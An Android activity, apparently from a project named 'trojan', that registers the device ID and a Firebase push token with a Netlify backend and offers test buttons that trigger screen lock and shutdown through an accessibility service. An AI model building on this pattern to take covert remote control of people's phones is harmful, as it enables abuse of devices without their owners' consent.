package com.trojan;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.messaging.FirebaseMessaging;

import org.json.JSONException;
import org.json.JSONObject;

public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";
    private TextView tvDeviceInfo;
    private Button btnOpenAccessibility;
    private Button btnTestLock;
    private Button btnTestShutdown;

    @SuppressLint("HardwareIds")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // --- Find all UI elements ---
        tvDeviceInfo = findViewById(R.id.tvDeviceInfo);
        btnOpenAccessibility = findViewById(R.id.btnOpenAccessibility);
        btnTestLock = findViewById(R.id.btnTestLock);
        btnTestShutdown = findViewById(R.id.btnTestShutdown);

        // --- Get Device ID and then fetch the FCM Token ---
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        String deviceInfoText = "Device ID:\n" + deviceId;
        tvDeviceInfo.setText(deviceInfoText);

        // Start the process to get the token and upload it to Netlify
        getTokenAndRegisterWithNetlify(deviceId);

        // --- Set up button click listeners (No changes needed here) ---
        btnOpenAccessibility.setOnClickListener(v -> {
            Toast.makeText(MainActivity.this, "Opening Accessibility Settings...", Toast.LENGTH_SHORT).show();
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });

        btnTestLock.setOnClickListener(v -> {
            Log.d(TAG, "Sending local LOCK broadcast");
            Toast.makeText(MainActivity.this, "Testing Lock Command...", Toast.LENGTH_SHORT).show();
            sendBroadcast(new Intent(PowerAccessibilityService.ACTION_TRIGGER_LOCK_SCREEN));
        });

        btnTestShutdown.setOnClickListener(v -> {
            Log.d(TAG, "Sending local SHUTDOWN broadcast");
            Toast.makeText(MainActivity.this, "Testing Shutdown Command...", Toast.LENGTH_SHORT).show();
            sendBroadcast(new Intent(PowerAccessibilityService.ACTION_TRIGGER_SHUTDOWN));
        });
    }

    /**
     * Fetches the current FCM registration token and then calls the function
     * to upload it to our new Netlify backend.
     * @param deviceId The unique ID for this device.
     */
    private void getTokenAndRegisterWithNetlify(String deviceId) {
        // First, display that we are fetching the token.
        tvDeviceInfo.append("\n\nFetching FCM Token...");

        FirebaseMessaging.getInstance().getToken().addOnCompleteListener(new OnCompleteListener<String>() {
            @Override
            public void onComplete(@NonNull Task<String> task) {
                if (!task.isSuccessful()) {
                    Log.w(TAG, "Fetching FCM registration token failed", task.getException());
                    tvDeviceInfo.append("\n\nFetching FCM Token Failed.");
                    return;
                }
                // Got the token, now upload it
                String token = task.getResult();
                Log.d(TAG, "FCM Token: " + token);
                registerDeviceWithNetlify(deviceId, token);
            }
        });
    }

    /**
     * Sends the deviceId and FCM token to our secure Netlify serverless function.
     * @param deviceId The unique ID for this device.
     * @param token The FCM registration token.
     */
    private void registerDeviceWithNetlify(String deviceId, String token) {
        tvDeviceInfo.append("\n\nUploading to server...");

        // This is the full URL to your Netlify function.
        String url = "https://trojanadmin.netlify.app/.netlify/functions/register-device";

        // Create the JSON object to send in the request body
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("token", token);
        } catch (JSONException e) {
            e.printStackTrace();
            tvDeviceInfo.append("\n\nError creating JSON payload.");
            return;
        }

        // Create the network request using Volley
        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(
                Request.Method.POST,
                url,
                postData,
                response -> {
                    // This code runs on a successful response from the server (HTTP 200-299)
                    Log.d("NETLIFY_REGISTER", "Success: " + response.toString());
                    tvDeviceInfo.append("\n\nToken successfully registered!");
                },
                error -> {
                    // This code runs if there's an error (HTTP 4xx or 5xx)
                    Log.e("NETLIFY_REGISTER", "Error: " + error.toString());
                    tvDeviceInfo.append("\n\nFailed to upload token to server.");
                }
        );

        // Get a RequestQueue and add the request to it to execute
        RequestQueue requestQueue = Volley.newRequestQueue(this);
        requestQueue.add(jsonObjectRequest);
    }
}
